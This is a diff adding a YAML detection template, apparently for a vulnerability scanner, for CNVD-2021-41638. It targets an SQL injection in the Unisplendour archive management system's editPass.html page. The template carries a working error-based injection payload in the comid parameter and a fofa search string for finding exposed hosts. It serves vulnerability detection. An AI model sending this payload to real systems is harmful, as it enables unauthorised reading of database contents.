@@ -1,0 +1,31 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: word
+        part: body
+        words:
+          - c4ca4238a0b923820dcc509a6f75849
+        condition: and
+      - type: word
+        part: body
+        words:
+          - 'XPATH syntax error:'
+        case-insensitive: true
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),{{md5(1)}}))'
+id: CNVD-2021-41638
+info:
+  author: peiqi0
+  description: |
+    紫光软件系统有限公司（以下简称“紫光软件”）是中国领先的行业解决方案和IT服务提供商。 紫光电子档案管理系统存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息
+    fofa: app="紫光档案管理系统"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 紫光档案管理系统 editPass.html SQL注入
+  severity: high
+  tags: cnvd,cnvd2021,sqli,argus-import
